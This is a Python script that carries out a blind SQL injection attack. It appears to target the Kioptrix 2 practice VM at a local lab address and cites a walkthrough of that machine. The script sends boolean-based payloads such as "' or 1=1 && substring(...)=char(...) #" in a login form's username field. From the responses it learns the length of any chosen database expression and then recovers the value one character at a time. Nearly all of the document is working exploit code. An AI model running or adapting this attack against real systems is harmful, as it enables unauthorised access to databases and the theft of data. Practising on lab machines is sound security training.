#!/usr/bin/env python3

# Reference:
# https://spencerdodd.github.io/2017/06/22/kioptrix-2/

import sys
import requests

chars = "abcdefghijklmnopqrstuvwxyz01234567890.()<>*^%$@!"
target = "192.168.56.101"
url = "http://192.168.56.101/index.php"
port = 80
fail_string = "Remote System"


def injection_assembler(injection):
    return url


def brute_force_field_value(field):
    result = ""
    length_of_field = get_field_length(field)
    for x in range(1, length_of_field + 1):
        print ("[*] Injecting for character in position {}".format(x))
        for char in chars:
            # print ("[*] Trying char {}".format(char))
            # ' or 1=1 && substring("test",1,1)=char(116) #
            injection = """' or 1=1 && substring({},{},1)=char({}) #""".format(field, x, ord(char))
            post_data = {
                "uname": injection,
                "psw": "test"
            }
            r = requests.request("POST", url=url, data=post_data)

            if injection_success(r):
                print ("	[+] Found character {}: {}".format(x, char))
                result += char
    print ("[+] Bruted value of {}: {}".format(field, result))


def get_field_length(field):
    for x in range(0, 200):
        # ' or 1=1 && char_length("test")=4 #
        injection = """' or 1=1 && char_length({})={} #""".format(field, x)
        post_data = {
            "uname": injection,
            "psw": "test"
        }
        r = requests.request("POST", url=url, data=post_data)
        if injection_success(r):
            print("[+] Length of field is {} characters".format(x))
            return x
    raise Exception("[-] Couldn't determine field length. Exiting.")


def injection_success(inj_response):
    if fail_string in inj_response.text:
        return False
    else:
        return True


def main():
    if len(sys.argv) > 1:
        field_to_brute = sys.argv[1]
        brute_force_field_value(field_to_brute)
    else:
        print("usage: python blind_sqli.py \"(field_to_brute)\""
              "\nexample:\tpython blind_sqli.py \"version()\"")


if __name__ == "__main__":
    main()
